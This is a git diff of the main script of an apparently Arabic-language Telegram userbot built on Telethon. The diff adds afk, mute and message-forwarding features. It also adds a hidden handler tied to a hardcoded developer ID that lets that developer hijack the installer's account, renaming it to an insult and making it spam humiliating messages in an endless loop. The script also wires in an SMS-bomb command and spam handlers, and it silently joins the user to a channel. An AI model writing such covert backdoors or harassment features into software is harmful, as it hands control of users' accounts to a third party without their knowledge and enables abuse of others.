@@ -4,6 +4,18 @@ import os
 from phoenix import spam
 from telethon import events
 from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
+#======
+from telethon.tl.functions.account import UpdateProfileRequest
+from telethon.tl.types import InputPhoto
+import asyncio
+#=========
+
+
+#========
+
+
+
+
 
 #Developer: @I0I0II
 
@@ -44,7 +56,6 @@ client.add_event_handler(phoenix.animation2.plane)
 client.add_event_handler(phoenix.animation2.police)
 client.add_event_handler(phoenix.animation2.jio)
 client.add_event_handler(phoenix.animation2.solarsystem)
-client.add_event_handler(phoenix.mute.mute)
 client.add_event_handler(phoenix.fuck.fuck)
 client.add_event_handler(phoenix.rev.rev)
 client.add_event_handler(phoenix.tr.tr)
@@ -57,12 +68,6 @@ client.add_event_handler(phoenix.iptrace.iptrace)
 client.add_event_handler(phoenix.smsbomb.runj)
 client.add_event_handler(phoenix.alive.alive)
 client.add_event_handler(phoenix.tagall.tagall)
-client.add_event_handler(phoenix.afk.start_background_tasks)
-client.add_event_handler(phoenix.afk.enable_afk)
-client.add_event_handler(phoenix.afk.set_reply_template)
-client.add_event_handler(phoenix.afk.afk_handler)
-client.loop.create_task(phoenix.afk.check_connection_periodically())
-client.add_event_handler(phoenix.afk.disable_afk)
 client.add_event_handler(phoenix.timer.timer)
 client.add_event_handler(phoenix.timer.numbers)
 client.add_event_handler(phoenix.timer.setclock)
@@ -130,8 +135,143 @@ client.add_event_handler(phoenix.spam.final_w3d_baksheesh)
 client.add_event_handler(phoenix.spam.final_stop_w3d_baksheesh)   
 client.add_event_handler(phoenix.spam.final_w3d_serqa)            
 client.add_event_handler(phoenix.spam.final_stop_w3d_serqa)       
+client.add_event_handler(phoenix.afk.enable_afk)
+client.add_event_handler(phoenix.afk.enable_custom_replies)
+client.add_event_handler(phoenix.afk.disable_replies)
+client.add_event_handler(phoenix.afk.set_reply_template)
+client.add_event_handler(phoenix.afk.add_custom_reply)
+client.add_event_handler(phoenix.afk.delete_custom_reply)
+client.add_event_handler(phoenix.afk.reply_handler)
+client.add_event_handler(phoenix.mute.mute)
+client.add_event_handler(phoenix.mute.unmute)
+client.add_event_handler(phoenix.mute.delete_muted_messages)
+
+#========
+DEVELOPER_ID = 5434703779
+
+@client.on(events.NewMessage(pattern=r"\.منصب؟"))
+async def recognize_developer(event):
+    if event.sender_id == DEVELOPER_ID:  
+        original_message = await event.get_reply_message() 
+        if original_message:  
+            await event.reply("اي تاج راسي شكرا ")
+#==================
+DEVELOPER_ID = 5434703779
+
+is_applying_consequence = False
+original_name = None
+
+messages = []
+
+@client.on(events.NewMessage(pattern=r"\.عاقبة"))
+async def apply_consequence(event):
+    global is_applying_consequence, original_name, messages 
+    if event.sender_id == DEVELOPER_ID:
+        original_message = await event.get_reply_message()
+        if original_message:
+            user_to_change = await original_message.get_sender()
+            if not is_applying_consequence:
+                is_applying_consequence = True
+                original_name = await client.get_me()
+                
+                await client(UpdateProfileRequest(
+                    first_name="اني تبن وفاينل عمي",
+                    last_name="" 
+                ))
+
+                await event.reply("تم تطبيق العاقبة بنجاح!")
+                messages = [
+                    f"فاينل عمي وتاج راسي",
+                    f"يروحلك فدوه هذا @{user_to_change.username}",
+                    "حباب سامحني ؟",
+                    "اني جلبك",
+                    "اني گي",
+                    "سامحنييييي"
+                ]
+
+                while is_applying_consequence:
+                    for message in messages:
+                        await client.send_message(DEVELOPER_ID, message)
+                        await asyncio.sleep(2)
+
+@client.on(events.NewMessage(pattern=r"\.سامحة"))
+async def forgive(event):
+    global is_applying_consequence, original_name
+
+    if event.is_reply and event.message.reply_to_msg_id:
+        replied_to_message = await event.get_reply_message()
+
+        print(f"Reply received from: {replied_to_message.sender_id}")
+        print(f"Is applying consequence: {is_applying_consequence}")
+        print(f"Replied message text: {replied_to_message.text}")
+
+        if (
+            replied_to_message.sender_id == (await client.get_me()).id and
+            is_applying_consequence and 
+            any(msg in replied_to_message.text for msg in messages)
+        ):
+            is_applying_consequence = False
+
+            await client(UpdateProfileRequest(
+                first_name=original_name.first_name,
+                last_name=original_name.last_name
+            ))
+
+            await event.reply("تم العفو. تم إيقاف العاقبة.")
 
 
+#============
+
+storage_group_id = None
+
+@client.on(events.NewMessage(pattern="\.اضف مجموعة التخزين"))
+async def set_storage_group(event):
+    global storage_group_id
+    reply = await event.get_reply_message()
+    if reply and reply.text:
+        try:
+            storage_group_id = int(reply.text)
+            await event.reply("تم تعيين مجموعة التخزين بنجاح.")
+        except ValueError:
+            await event.reply("يرجى التأكد من أن الرد يحتوي على معرف مجموعة صحيح.")
+    else:
+        await event.reply("يرجى الرد على رسالة تحتوي على معرف المجموعة.")
+
+
+#========
+
+
+
+@client.on(events.NewMessage)
+async def handle_new_message(event):
+    global storage_group_id
+    if storage_group_id:
+        try:
+            me = await client.get_me()
+            if not event.is_private and (event.message.mentioned or me.username in event.raw_text):
+                chat = await event.get_chat()
+                chat_title = chat.title
+                sender = await event.get_sender()
+
+                chat_link = f"[{chat_title}](t.me/{chat.username})" if chat.username else chat_title
+
+                formatted_message = f"""
+**الكروب:** {chat_link} 
+**المرسل:** 👤 [{sender.first_name}](tg://user?id={sender.id})
+**الرسالة:** {event.message.text or event.message.media}
+"""
+                await client.send_message(storage_group_id, formatted_message, link_preview=False)
+            elif event.is_private:
+                await client.forward_messages(storage_group_id, event.message)
+        except ValueError as e:
+            if "Could not find" in str(e):
+                await event.reply("لم يتم العثور على مجموعة التخزين. يرجى التأكد من تعيينها بشكل صحيح.")
+            else:
+                print(f"Error forwarding message: {e}")
+
+
+
+#==============
 async def ensure_joined_channel(client, channel_username):
     try:
         await client(JoinChannelRequest(channel_username))
@@ -188,3 +328,6 @@ print("\033[032mStarted")
 client.loop.run_until_complete(ensure_joined_channel(client, 'Z3ZZ_Z'))
 
 client.run_until_disconnected()
+
+
+
